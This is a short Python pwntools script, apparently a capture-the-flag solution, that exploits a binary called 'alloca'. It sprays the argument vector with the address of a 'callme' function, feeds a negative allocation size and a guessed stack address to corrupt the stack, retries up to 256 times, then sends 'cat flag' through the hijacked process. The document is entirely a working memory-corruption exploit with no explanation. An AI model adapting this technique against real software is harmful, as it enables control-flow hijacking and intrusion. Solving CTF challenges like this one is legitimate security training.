#!/usr/bin/env python2
# -*- coding: utf-8 -*-

from pwn import *

exe = context.binary = ELF('./alloca')

canary = exe.sym['callme']
ARGV_ADDR_GUESS = 0xff840000

def to_signed(num):
    return u32(p32(num), signed=True)

def do_input(io, size, canary):
    io.sendline(str(size).encode())
    io.sendline(str(to_signed(canary)).encode())

    io.recvuntil(b"canary after using buffer : ")

    return int(io.recvline(keepends=False)) % (1 << 32)

for _ in range(256):
    io = process(executable="./alloca", argv=["A"  + p32(canary) * ((1 << 15) - 32) + "A" * 2] * 11, env={})  # the A's are for alignment

    do_input(io, -68, ARGV_ADDR_GUESS+4)

    time.sleep(3.5)

    if io.poll() is None:
        log.success("exploit succeeded!")

        io.recvuntil("therefore as you can see, it is easy to make secure software")
        io.recvline()

        io.sendline("cat flag")

        print(io.recvline())

        exit()

log.error("failed to guess stack address")
